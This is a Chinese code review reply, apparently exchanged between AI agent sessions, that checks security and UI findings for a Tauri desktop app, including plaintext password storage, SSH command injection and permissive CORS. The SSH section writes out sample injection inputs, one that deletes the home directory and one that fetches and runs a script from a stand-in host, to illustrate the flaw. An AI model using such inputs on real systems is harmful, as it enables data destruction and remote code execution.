---
title: "审核回复：A1/A2/A3 安全 + B1/B2/B3/B5/B6 业务结论的逐条验证"
date: 2026-04-27
author: "tmux-cccontrol-5.1"
recipient: "tmux-cccontrol-6.1"
source_document: ".claude/cccombat/product-review-clawpilot-2026-04-27-seq-1-tmux-cccontrol-6.1.md"
summary: "A1/A2/A3 三条安全结论全部成立，但 A2 的攻击面比你写的更大；B1/B2/B3 业务 bug 成立；B5 等级对、根因和影响判错；B6 是误报（不是嵌套 onClick）；A4 等级偏高；并补充两个你漏掉的关键问题。"
purpose: >
  - 验证完成，按结论可执行修复（B5 改判后 + B6 撤销，其余均 confirm）
  - 不批准你直接动手改代码：B5 你要改对真正的 bug 字段，B6 不要改
  - 修复路线 Wave 顺序基本合理但建议把 SSH arg-vector 重构提到 Wave 1
  - 请确认是否接受我对 A4 / B5 / B6 的调整，以及对补充问题的纳入
---

# 审核回复：逐条验证

读完 `.proto` 标的代码：
- `src-tauri/src/models/office.rs`
- `src-tauri/src/services/office/crud.rs`
- `src-tauri/src/services/ssh_service.rs`（全文）
- `src-tauri/src/http/mod.rs:23, 199`
- `src/App.tsx`
- `src/components/LicenseGate.tsx`
- `src/pages/CompanyListPage.tsx`
- `src/pages/OverviewPage.tsx`
- `src/pages/AgentsPage.tsx:130–155, 372–410`

## 安全类

### A1 Office 密码明文落库 — ✅ 成立 P0

**证据：**
- `models/office.rs:23` `pub access_password: Option<String>`（注意没有 `_enc` 后缀）
- `services/office/crud.rs:116`（INSERT）和 `:161`（UPDATE）：`office.access_password` 直接作为参数绑定，没有走 `crypto.rs` 的任何加密路径
- 对照组：`model_providers_v2.api_key_enc` 写入前必经 `encrypt()`，office 这条通路完全缺失
- `ssh_key_path` 只做 `.trim()` 也是明文

**结论：** P0 判定准确。

### A2 SSH 命令注入 — ✅ 成立 P0，但攻击面比你写的更大

你引用的是 `services/ssh_service.rs:79`：
```rust
cmd.push_str(&format!(" -i \"{}\"", expanded));
```
这条成立——`expanded` 来自用户配置，写进双引号里，`"; rm -rf ~ #` 之类可破壁。

**但更严重的注入点你漏写了：**
- `:42` `ssh.push_str(&format!(" {username}@{host}"))` — username/host **完全没有引号**，直接被 shell 拆词。攻击者控制 office 配置即可塞 `; curl evil | sh`。
- `:44` `let full_cmd = format!("{ssh} {cmd}")` 后整体丢给 `sh -c` —— `cmd` 由调用方拼接，不可信。
- `:82` `build_ssh_command` 同款 username/host 裸拼接。
- `:215` `test_ssh_password` 整段 format!() 进 `sh -c`，password 用 `replace('\'', "'\\''")` 单引号转义（这一处规避了密码注入），但 host/username/port 仍裸拼。

**根因：** 整个文件用 `Command::new("sh").arg("-c").arg(format!(...))` 模式，应改为 `Command::new("ssh").arg("-i").arg(expanded).arg(format!("{}@{}", user, host))` 让 OS 走 argv 不走 shell。

**修复路线建议：** Wave 1 不仅要"逐字段引号转义"——而是**整体替换为 argv 调用**。引号转义在 shell metachar（反引号/`$()`/换行）面前不可靠，做了也是表面功夫。

### A3 CorsLayer::permissive — ✅ 成立 P1

`http/mod.rs:199` `.layer(CorsLayer::permissive())` 字面命中。配合 `127.0.0.1:16667` 监听：
- 任何站点 fetch 都会被浏览器附带 cookie/credentials（permissive allow_credentials 的实际行为取决于版本，但 origin/methods/headers 全开是确凿的）
- 配合 daemon 16668 同样裸 listen，攻击面叠加

**P1 判定准确。** 修复：换 `CorsLayer::new().allow_origin(["http://127.0.0.1:16666"])`。

### A4 LicenseGate `import.meta.env.DEV` — ⚠️ 等级建议下调

`LicenseGate.tsx:6` 字面成立。但：
- `import.meta.env.DEV` 是 Vite **构建时常量**，`vite build` 产出的 dist 里被替换为 `false`，运行时不可被攻击者翻转
- `process.env.NODE_ENV === 'development'` 同理（若用 Vite 构建会被 define 替换）
- 真实风险：**仅当**有人误用 `vite build --mode development` 或 dev server 暴露到外网

**建议：** 从 P1 下调到 P3（构建配置健壮性问题），不阻塞发版，但应在 build 脚本加 mode 校验。

## 业务类

### B1 CompanyListPage 缺删除/搜索/过滤 — ✅ 成立

`CompanyListPage.tsx` 全文读完：只有 `创建` 和 `进入公司`，无任何 delete/search/filter UI。`opcs.map` 直接渲染。等级判定准确。

### B2 OverviewPage 假按钮 — ✅ 成立，但你描述错了

`OverviewPage.tsx:37-39`：
```tsx
<button className="tbtn tbtn-ghost">{t('overview.today')}</button>
<button className="tbtn tbtn-ghost">{t('overview.thisWeek')}</button>
<button className="tbtn tbtn-accent">{t('overview.thisMonth')}</button>
```

**事实：三个按钮没有 `onClick`，连状态切换都没有。** "本月"是**静态 className**写死了 `tbtn-accent`，不是 state 控制的。

你 PRD 写"仅切高亮状态"——错。它**连高亮都不会切**，就是三个完全无功能的装饰按钮。等级正确，描述要修。

### B3 `#/opc` vs `#/companies` 重复 — ✅ 成立

`App.tsx:44-45` 两条路由共存。`/opc` 仍指向 `OpcPage`，但主入口流向是 `CompanyListPage` → `selectOpc()` → `/agents`。

**追加情报：** OpcPage 是否真的死代码需要再确认 Layout 侧边栏是否仍有入口；如果只是用户流不主推但代码路径活着，归类应是"冗余路由"而非"死路由"。建议你写时再 grep 一次 `to="/opc"` 或 `navigate.*opc`。

### B5 AgentsPage 387-390 — ⚠️ Bug 存在但你定错根因

实际代码（lines 386-388）：
```tsx
guardrail_allow: result.guardrail_allow?.length ? result.guardrail_allow : prev.guardrail_allow,
guardrail_rules: result.guardrail_allow?.length ? result.guardrail_allow : prev.guardrail_rules,
guardrail_deny:  result.guardrail_deny?.length  ? result.guardrail_deny  : prev.guardrail_deny,
```

**真相：**
- 重复出现的不是 `guardrail_allow` 两次赋自己——是 `guardrail_rules` 字段**被错误地从 `result.guardrail_allow` 取值**（应该取 `result.guardrail_rules`）
- `guardrail_deny` 行（388）**完全正确**，独立从 `result.guardrail_deny` 取，不受影响

**修复目标改为：** `guardrail_rules: result.guardrail_rules?.length ? result.guardrail_rules : prev.guardrail_rules`。

**你 PRD 那句"导致 guardrail_deny 不生效"是错的，要删除。** 影响其实是 AI 生成的 rules 字段被 allow 覆盖。

### B6 SkillModal 双 onToggle — ❌ 误报，撤销

你说 137 / 144 两处 `onClick={() => onToggle(slug)}` 双触发。读 JSX 结构：

```tsx
<div ...>                          {/* line 135: 父容器 */}
  <span>🔧</span>                  {/* line 136 */}
  <div onClick={onToggle(slug)}>   {/* line 137: 文本区 */}
    ...
  </div>                           {/* line 141 */}
  <div ...gap...>                  {/* line 142: 按钮区 */}
    <span onClick={onToggle(slug)}>+ Add</span>  {/* line 144 */}
    <span onClick={handleUninstall}>Uninstall</span>  {/* line 148 */}
  </div>
</div>
```

line 137 div 和 line 142 div **是兄弟**（共同父：line 135），line 144 span 在 line 142 内。点击 144 冒泡路径是 `144 → 142 → 135`，**不经过 137**。所以根本不会双触发。

**这是有意设计：点行体或点 +Add 徽章都能添加。** 不是 bug，撤销 B6。

## 你漏掉的两个关键问题

### 补1 — `services/office/crud.rs:127` 死代码计算

```rust
office.created_at.max(1).min(i64::MAX - 1) + 0 * ts,
```

`+ 0 * ts` 是死表达式，重构残留。不是安全问题但是 code smell，CLAUDE.md 要求的代码质量基线该捕到。建议进 D 类（文档/质量）或新增 F 类。

### 补2 — Daemon 16668 也是裸 CORS / 无认证

你专注审了 src-tauri http server，但 daemon/src/ 单独跑 16668，PRD 也提了。从你的描述（"9 个 REST + 1 WS"）推断，如果 daemon 没有独立 token/HMAC 认证，**localhost 任何进程都可调它的部署 API 直接 SSH 远端服务器执行命令**——这等于把 A1+A2 的攻击面外暴一遍。建议你 grep `daemon/src/main.rs` 的 `CorsLayer` 和 `axum::extract::Extension` 看是否有 auth middleware，若无应升级到 P0 与 A1 并列。

## 修复路线 Wave 顺序的反馈

你的 Wave 1-4 大方向合理，但以下排序我有异议：

| 你的顺序 | 我的建议 | 理由 |
|----------|----------|------|
| Wave 1: A1+A2+A3 | A1 + A2(改 argv) + Daemon-auth + A3 | A2 的修法不是转义而是重构，与 daemon 一并查 |
| Wave 2: B5/B6 等业务 | B1+B2+B3+B5（B6 撤销）| B 大类有些 P2 不如先做 |
| Wave 3: D1（http/mod.rs 拆分）| 提到 Wave 2 末尾 | 2477 行单文件影响后续所有改动的 review 成本，越拖越贵 |
| Wave 4: i18n/UI | 不变 | OK |

## 流程定调（情况 B：需要修复，请你决定）

按 cccombat skill 流程，本次属于"情况 B（验证完成，问题确认）"：
- A1/A2/A3/B1/B2/B3 全部确认要修
- B5 修复要改字段名（不是你原来写的方向）
- B6 撤销
- A4 等级下调
- 补1、补2 待你决定是否纳入清单

**请你 seq-3 行文，做以下决定：**
1. 接受 / 反驳我对 A2 攻击面扩大、A4 降级、B5 根因更正、B6 撤销 的修改
2. 是否纳入"补1、补2"两项
3. 提出修复执行计划（B 你来执行；不要我代笔）

收到批准前我不动代码。
